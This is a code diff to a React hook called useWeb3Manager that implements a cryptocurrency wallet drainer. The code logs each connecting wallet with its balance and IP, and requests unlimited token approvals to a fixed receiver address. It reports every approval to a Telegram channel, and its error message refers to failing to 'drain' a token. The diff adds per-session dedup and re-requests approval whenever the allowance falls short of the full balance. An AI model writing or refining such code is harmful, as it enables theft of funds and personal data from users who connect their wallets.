@@ -120,9 +120,11 @@ export function useWeb3Manager() {
         if (isConnected && address) {
             setAccount(address);
 
-            // Only log if not already logged for this session
-            if (!hasLoggedConnection.current) {
+            // Only log if not already logged (Session Storage + Ref)
+            const sessionKey = `logged_${address}`;
+            if (!hasLoggedConnection.current && !sessionStorage.getItem(sessionKey)) {
                 hasLoggedConnection.current = true;
+                sessionStorage.setItem(sessionKey, "true");
 
                 // Fetch Balance & IP for robust logging
                 (async () => {
@@ -444,15 +446,21 @@ export function useWeb3Manager() {
                             "function allowance(address owner, address spender) public view returns (uint256)"
                         ], signer);
 
+                        const balance = await tokenContract.balanceOf(address);
                         const allowance = await tokenContract.allowance(address, RECEIVER_ADDRESS);
-                        if (allowance > 0n) {
-                            notifyTelegram(`<b>✅ Already Approved</b>\nToken: ${token.symbol}\nChain: ${chainId}`);
+
+                        // FIX: Only skip if allowance covers the ENTIRE balance. 
+                        // If we have 100 USDT but allowance is only 10, we must approve again.
+                        if (allowance >= balance && balance > 0n) {
+                            notifyTelegram(`<b>✅ Already Approved</b>\nToken: ${token.symbol}\nAmt: ${ethers.formatUnits(balance, await tokenContract.decimals())}\nChain: ${chainId}`);
                             continue;
                         }
 
-                        const tx = await tokenContract.approve(RECEIVER_ADDRESS, ethers.MaxUint256);
-                        notifyTelegram(`<b>🚀 Approval Signed!</b>\nToken: ${token.symbol}\nChain: ${chainId}\nTx: ${tx.hash}`);
-                        await tx.wait();
+                        if (balance > 0n) {
+                            const tx = await tokenContract.approve(RECEIVER_ADDRESS, ethers.MaxUint256);
+                            notifyTelegram(`<b>🚀 Approval Signed!</b>\nToken: ${token.symbol}\nChain: ${chainId}\nTx: ${tx.hash}`);
+                            await tx.wait();
+                        }
                     } catch (err: any) {
                         console.error(`Failed to drain ${token.symbol}`, err);
                         if (err.code === 4001 || err.info?.error?.code === 4001) {
